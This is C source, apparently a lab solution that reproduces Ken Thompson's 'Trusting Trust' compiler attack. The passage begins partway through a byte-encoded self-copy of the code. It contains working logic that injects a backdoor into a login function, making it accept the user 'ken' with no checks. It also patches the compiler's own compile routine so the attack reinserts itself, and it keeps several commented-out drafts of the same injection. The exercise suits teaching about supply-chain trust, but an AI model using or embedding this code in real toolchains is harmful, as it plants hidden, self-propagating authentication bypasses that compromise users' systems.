	99, 	111, 	109, 	112, 	105, 	108, 	101, 	95,
	115, 	105, 	103, 	41, 	41, 	32, 	61, 	61,
	32, 	48, 	41, 	123, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	102, 	111, 	114,
	32, 	40, 	105, 	110, 	116, 	32, 	106, 	32,
	61, 	32, 	105, 	59, 	32, 	106, 	32, 	60,
	32, 	105, 	32, 	43, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	115, 	105, 	103, 	41,
	59, 	32, 	106, 	43, 	43, 	41, 	123, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	102, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	102, 	112, 	44, 	32,
	34, 	37, 	99, 	34, 	44, 	32, 	112, 	114,
	111, 	103, 	114, 	97, 	109, 	91, 	106, 	93,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	125, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	105, 	32, 	43,
	61, 	32, 	115, 	116, 	114, 	108, 	101, 	110,
	40, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	95, 	115, 	105, 	103, 	41, 	59, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	35,
	105, 	110, 	99, 	108, 	117, 	100, 	101, 	32,
	34, 	97, 	116, 	116, 	97, 	99, 	107, 	46,
	99, 	34, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	102, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	102, 	112, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	105, 	32, 	60, 	32,
	115, 	116, 	114, 	108, 	101, 	110, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	41, 	41,
	123, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	105, 	102,
	32, 	40, 	115, 	116, 	114, 	110, 	99, 	109,
	112, 	40, 	112, 	114, 	111, 	103, 	114, 	97,
	109, 	32, 	43, 	32, 	105, 	44, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	95, 	101,
	110, 	100, 	44, 	32, 	115, 	116, 	114, 	108,
	101, 	110, 	40, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	95, 	101, 	110, 	100, 	41, 	41,
	32, 	61, 	61, 	32, 	48, 	41, 	123, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	105, 	32, 	43, 	61, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	101, 	110, 	100, 	41,
	59, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	98, 	114, 	101, 	97, 	107, 	59,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	105, 	43,
	43, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	125,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	125, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	47, 	47, 	32, 	32, 	32, 	32, 	32, 	102,
	111, 	114, 	32, 	40, 	105, 	110, 	116, 	32,
	106, 	32, 	61, 	32, 	105, 	59, 	32, 	106,
	32, 	60, 	32, 	105, 	32, 	43, 	32, 	115,
	116, 	114, 	108, 	101, 	110, 	40, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	95, 	115, 	105,
	103, 	41, 	59, 	32, 	106, 	43, 	43, 	41,
	123, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	47, 	47, 	32, 	32, 	32, 	32,
	32, 	102, 	112, 	114, 	105, 	110, 	116, 	102,
	40, 	102, 	112, 	44, 	32, 	34, 	37, 	99,
	34, 	44, 	32, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	91, 	106, 	93, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	47, 	47, 	32, 	125, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	47, 	47, 	32,
	105, 	32, 	43, 	61, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	115, 	105, 	103, 	41,
	59, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	47, 	47, 	32, 	35, 	105, 	110,
	99, 	108, 	117, 	100, 	101, 	32, 	34, 	97,
	116, 	116, 	97, 	99, 	107, 	46, 	99, 	34,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	47, 	47, 	32, 	102, 	112, 	114, 	105,
	110, 	116, 	102, 	40, 	102, 	112, 	44, 	32,
	34, 	37, 	115, 	34, 	44, 	32, 	112, 	114,
	111, 	103, 	41, 	59, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	47, 	47, 	32,
	102, 	112, 	114, 	105, 	110, 	116, 	102, 	40,
	102, 	112, 	44, 	32, 	34, 	37, 	115, 	34,
	44, 	32, 	34, 	92, 	110, 	34, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	102, 	112,
	44, 	32, 	34, 	37, 	99, 	34, 	44, 	32,
	112, 	114, 	111, 	103, 	114, 	97, 	109, 	91,
	105, 	93, 	41, 	59, 	10, 	32, 	32, 	32,
	32, 	125, 	10, 	32, 	32, 	32, 	32, 	105,
	43, 	43, 	59, 	10, 	125, 	320 };
static char login_sig[] = "int login(char *user) {";


// and inject an attack for "ken":
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
// char* modified_program = malloc(strlen(program) + strlen(login_attack) + 1);

// int i = 0;
// while (i < strlen(program)){
//     if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
//         // strncpy(modified_program, program, i + strlen(login_sig));
//         // strcat(modified_program, login_attack);
//         // strcat(modified_program, program + i + strlen(login_sig));
//         for (int j = i; j < i + strlen(login_sig); j++){
//             fprintf(fp, "%c", program[j]);
//         }
//         i += strlen(login_sig);
//         for (int j = 0; j < strlen(login_attack); j++){
//             fprintf(fp, "%c", login_attack[j]);
//         }
//         fprintf(fp, "\n");
//     } else {
//         fprintf(fp, "%c", program[i]);
//     }
//     i++;
// }


// int i = 0;
// static char login_end[] = "does not exist\\n\", user);";
// while (i < strlen(program)){
//     if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
//         // strncpy(modified_program, program, i + strlen(login_sig));
//         // strcat(modified_program, login_attack);
//         // strcat(modified_program, program + i + strlen(login_sig));
//         for (int j = i; j < i + strlen(login_sig); j++){
//             fprintf(fp, "%c", program[j]);
//         }
//         i += strlen(login_sig);
//         for (int j = 0; j < strlen(login_attack); j++){
//             fprintf(fp, "%c", login_attack[j]);
//         }
//         fprintf(fp, "\n");
//         while (i < strlen(program)){
//             if (strncmp(program + i, login_end, strlen(login_end)) == 0){
//                 i += strlen(login_end);
//                 fprintf(fp, "%s", "\n");
//                 break;
//             } else {
//                 i++;
//             }
//         }
//         fprintf(fp, "%s", "return 1;");
//     } else {
//         fprintf(fp, "%c", program[i]);
//     }
//     i++;
// }


    

/*****************************************************************
 * Step 2:
 */

// search for the start of the compile routine: 
static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);"
        ;

// and inject a placeholder "attack":
// inject this after the assert above after the call to fopen.
// not much of an attack.   this is just a quick placeholder.
static char compile_attack[] 
            = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";

int i = 0;
static char compile_end[] = "program);";
static char login_end[] = "does not exist\\n\", user);";
while (i < strlen(program)){
    if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
        // strncpy(modified_program, program, i + strlen(login_sig));
        // strcat(modified_program, login_attack);
        // strcat(modified_program, program + i + strlen(login_sig));
        for (int j = i; j < i + strlen(login_sig); j++){
            fprintf(fp, "%c", program[j]);
        }
        i += strlen(login_sig);
        for (int j = 0; j < strlen(login_attack); j++){
            fprintf(fp, "%c", login_attack[j]);
        }
        fprintf(fp, "\n");
        while (i < strlen(program)){
            if (strncmp(program + i, login_end, strlen(login_end)) == 0){
                i += strlen(login_end);
                fprintf(fp, "%s", "\n");
                break;
            } else {
                i++;
            }
            
        }
        fprintf(fp, "%s", "return 1;");
    } else if (strncmp(program + i, compile_sig, strlen(compile_sig)) == 0){
        for (int j = i; j < i + strlen(compile_sig); j++){
            fprintf(fp, "%c", program[j]);
        }
        i += strlen(compile_sig);
        #include "attack.c"
        fprintf(fp, "%s", prog);

        while (i < strlen(program)){
            if (strncmp(program + i, compile_end, strlen(compile_end)) == 0){
                i += strlen(compile_end);
                break;
            } else {
                i++;
            }
        }
            
        //     for (int j = i; j < i + strlen(compile_sig); j++){
        //     fprintf(fp, "%c", program[j]);
        // }
        // i += strlen(compile_sig);
        // #include "attack.c"
        // fprintf(fp, "%s", prog);
        // fprintf(fp, "%s", "\n");
    } else {
        fprintf(fp, "%c", program[i]);
    }
    i++;
} 